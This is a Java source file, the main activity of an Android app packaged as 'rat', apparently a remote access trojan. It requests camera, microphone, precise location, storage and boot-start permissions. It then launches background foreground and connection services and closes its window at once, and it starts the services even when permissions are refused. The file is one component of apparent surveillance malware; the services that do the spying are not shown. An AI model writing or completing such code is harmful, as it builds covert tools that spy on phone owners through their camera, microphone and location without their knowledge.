package com.fly0rakoon.rat;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.fly0rakoon.rat.services.ConnectionService;
import com.fly0rakoon.rat.services.ForegroundService;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_CODE = 100;

    // Essential permissions needed for the app to function
    private final String[] REQUIRED_PERMISSIONS = new String[]{
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        try {
            Log.d(TAG, "MainActivity onCreate started");
            
            // Check and request permissions
            if (checkAndRequestPermissions()) {
                // Permissions already granted, start services
                startServices();
                finish();
            }
            // Otherwise, onRequestPermissionsResult will handle it
            
            Log.d(TAG, "MainActivity onCreate completed");
        } catch (Exception e) {
            Log.e(TAG, "Error in onCreate", e);
            Toast.makeText(this, "Error initializing app: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    private boolean checkAndRequestPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();
        
        for (String permission : REQUIRED_PERMISSIONS) {
            try {
                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                    permissionsNeeded.add(permission);
                }
            } catch (Exception e) {
                Log.e(TAG, "Error checking permission: " + permission, e);
            }
        }
        
        if (permissionsNeeded.isEmpty()) {
            return true;
        } else {
            ActivityCompat.requestPermissions(this, 
                permissionsNeeded.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
            return false;
        }
    }

    private void startServices() {
        try {
            Log.d(TAG, "Starting services");
            
            // Start ForegroundService
            Intent foregroundIntent = new Intent(this, ForegroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(foregroundIntent);
            } else {
                startService(foregroundIntent);
            }
            
            // Start ConnectionService
            Intent connectionIntent = new Intent(this, ConnectionService.class);
            startService(connectionIntent);
            
            Log.d(TAG, "Services started successfully");
            Toast.makeText(this, "Services started", Toast.LENGTH_SHORT).show();
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting services", e);
            Toast.makeText(this, "Error starting services: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    Log.d(TAG, "Permission denied: " + permissions[i]);
                } else {
                    Log.d(TAG, "Permission granted: " + permissions[i]);
                }
            }
            
            if (allGranted) {
                Toast.makeText(this, "All permissions granted", Toast.LENGTH_SHORT).show();
                startServices();
                finish();
            } else {
                Toast.makeText(this, "Some permissions were denied. App may not function properly.", Toast.LENGTH_LONG).show();
                // Still try to start services with whatever permissions we have
                startServices();
                finish();
            }
        }
    }
}
